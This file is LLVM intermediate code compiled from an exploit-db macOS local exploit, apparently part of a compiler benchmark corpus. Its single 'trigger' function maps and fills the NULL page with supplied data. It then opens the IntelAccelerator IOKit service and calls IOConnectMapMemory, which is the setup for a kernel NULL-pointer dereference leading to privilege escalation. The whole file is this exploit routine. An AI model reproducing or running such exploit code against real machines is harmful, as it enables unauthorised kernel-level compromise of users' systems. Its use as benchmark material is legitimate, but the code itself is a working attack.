; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_trigger.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/local/extr_35848.c_trigger.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"IntelAccelerator\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@kIOMapAnywhere = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @trigger(i8* %0, i64 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i64 %1, i64* %4, align 8
  store i32 1094803456, i32* %5, align 4
  %15 = call i32 (...) @mach_task_self()
  %16 = call i32 @mach_vm_allocate(i32 %15, i32* %5, i32 131072, i32 0)
  %17 = load i32, i32* %5, align 4
  %18 = call i32 @memset(i32 %17, i32 0, i32 131072)
  %19 = load i8*, i8** %3, align 8
  %20 = load i64, i64* %4, align 8
  %21 = call i32 @memcpy(i8* inttoptr (i64 1094844416 to i8*), i8* %19, i64 %20)
  %22 = call i32 (...) @mach_task_self()
  %23 = call i32 @vm_deallocate(i32 %22, i32 0, i32 4096)
  store i32 0, i32* %5, align 4
  %24 = call i32 (...) @mach_task_self()
  %25 = call i32 @vm_allocate(i32 %24, i32* %5, i32 4096, i32 0)
  store i8* null, i8** %6, align 8
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %34, %2
  %27 = load i32, i32* %7, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %37

29:                                               ; preds = %26
  %30 = load i8*, i8** %6, align 8
  %31 = load i32, i32* %7, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  store i8 65, i8* %33, align 1
  br label %34

34:                                               ; preds = %29
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %26

37:                                               ; preds = %26
  store i32* null, i32** %8, align 8
  %38 = load i32*, i32** %8, align 8
  store volatile i32 1094844416, i32* %38, align 4
  %39 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  store i32 %39, i32* %9, align 4
  %40 = load i32, i32* @kIOMasterPortDefault, align 4
  %41 = load i32, i32* %9, align 4
  %42 = call i32 @IOServiceGetMatchingServices(i32 %40, i32 %41, i32* %10)
  store i32 %42, i32* %11, align 4
  %43 = load i32, i32* %10, align 4
  %44 = call i32 @IOIteratorNext(i32 %43)
  store i32 %44, i32* %12, align 4
  %45 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %45, i32* %13, align 4
  %46 = load i32, i32* %12, align 4
  %47 = call i32 (...) @mach_task_self()
  %48 = call i32 @IOServiceOpen(i32 %46, i32 %47, i32 2, i32* %13)
  store i32 %48, i32* %11, align 4
  store i32 305418240, i32* %5, align 4
  store i32 4096, i32* %14, align 4
  %49 = load i32, i32* %13, align 4
  %50 = call i32 (...) @mach_task_self()
  %51 = load i32, i32* @kIOMapAnywhere, align 4
  %52 = call i32 @IOConnectMapMemory(i32 %49, i32 3, i32 %50, i32* %5, i32* %14, i32 %51)
  store i32 %52, i32* %11, align 4
  ret void
}

declare dso_local i32 @mach_vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @memset(i32, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i64) #1

declare dso_local i32 @vm_deallocate(i32, i32, i32) #1

declare dso_local i32 @vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @IOServiceGetMatchingServices(i32, i32, i32*) #1

declare dso_local i32 @IOIteratorNext(i32) #1

declare dso_local i32 @IOServiceOpen(i32, i32, i32, i32*) #1

declare dso_local i32 @IOConnectMapMemory(i32, i32, i32, i32*, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
